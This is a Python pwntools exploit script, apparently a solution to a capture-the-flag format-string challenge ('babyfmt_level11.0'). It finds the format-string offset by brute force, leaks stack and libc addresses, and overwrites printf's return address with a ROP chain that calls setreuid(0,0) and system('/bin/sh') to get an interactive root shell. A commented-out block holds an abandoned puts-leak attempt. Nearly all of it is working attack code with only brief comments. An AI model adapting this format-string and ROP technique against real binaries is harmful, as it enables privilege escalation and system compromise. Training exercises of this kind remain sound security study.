# idea: write func addr in to ret inside printf to get a looping func (and hence infinite printf)
# 1. first printf : leak %7$p which is (rsp when ret inside printf) + 120, leak %138$p which is *func + 957. Also calculate binary base with %138$p. Leak %153$p, which is __libc_start_main+243
# 2. second printf : write system(/bin/sh) into (rsp when ret inside printf)


from pwn import *

context.arch = 'amd64'

def get_offset():
    dummy = b"aaaabaaacaaadaaaeaaa"
    for i in range(6, 100):
        p = process("/challenge/babyfmt_level11.0")
        print(p.recv())
        p.send(dummy + b"INIT" + b"%" + f'{i:d}'.encode('utf-8') + b"$pFINI")
        p.recvuntil(b"Your input is:")
        p.recvline()
        output = p.recv()
        print(output)
        p.close()
        if b"616161" in output:
            # either in offset or in padding
            leak = output[output.index(b"INIT") + 4 : output.index(b"FINI")]
            leak = leak[2:]
            if leak[-2:] != b'61' and leak[-2:] != b'62':
                # we are in padding
                continue
            else:
                leak = bytes.fromhex(leak.decode())[::-1]
                padlen = cyclic_find(leak)
                return padlen, i


padlen, offset = get_offset()
print(padlen)
print(offset)
prefix_length = 80 # the string prefix in printf

elf = ELF("/challenge/babyfmt_level11.0")
rop = ROP(elf)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

#p = gdb.debug("/challenge/babyfmt_level11.0", gdbscript='''
#b *func+506
#b *printf+198
#commands
#x/4gx $rsp
#end
#''')
p = process("/challenge/babyfmt_level11.0")

# leak stack addr & libc base
payload = b"A" * padlen + b"%7$p||%153$p"
p.send(payload)
p.recvuntil(b"Your input is:")
p.recvline()
output = p.recvuntil(b'\nNow')[:-4]
printf_ret = int(output.split(b'||')[0], 16) - 120
libc_base = int(output.split(b'||')[1], 16) - libc.sym['__libc_start_main'] - 243
print("printf_ret = {}".format(hex(printf_ret)))
print("libc base = {}".format(hex(libc_base)))
print("TEST: puts addr = {}".format(hex(libc_base + libc.sym['puts'])))
'''
binary_base = func_addr - elf.sym['func']

# write *func into printf_ret
payload = b"A" * padlen + fmtstr_payload(offset, {printf_ret: func_addr}, numbwritten = prefix_length + padlen)
p.send(payload)
print(p.recv())

# leak libc addr
pop_rdi = rop.rdi.address + binary_base

rop.raw(pop_rdi)
rop.raw(elf.got['puts'] + binary_base)
rop.raw(elf.plt['puts'] + binary_base)
print("puts@got = {}".format(hex(elf.got['puts'] + binary_base)))
rop.raw(func_addr)

printf_ret += 0x8 # stack shifted after restart

payload = b"A" * padlen + fmtstr_payload(offset, {printf_ret: rop.chain()}, numbwritten = prefix_length + padlen)
p.send(payload)
p.recvuntil(b"Your input is:")
p.recvline()
x = p.recv()
print(x)
#puts_addr = unpack(p.recvuntil(b'\nIn this')[-14:-8], 'all')
#print("puts addr = {}".format(hex(puts_addr)))
'''
# system(/bin/sh)
libc.address = libc_base
libc_rop = ROP(libc)

bin_sh = next(libc.search(b'/bin/sh'))
ret = libc_rop.ret.address
libc_rop.setreuid(0, 0)
#libc_rop.raw(ret)
libc_rop.system(bin_sh)

payload = b"A" * padlen + fmtstr_payload(offset, {printf_ret: libc_rop.chain()}, numbwritten = prefix_length + padlen) # # of written bytes need to include payload in previous loops
p.send(payload)
p.interactive()

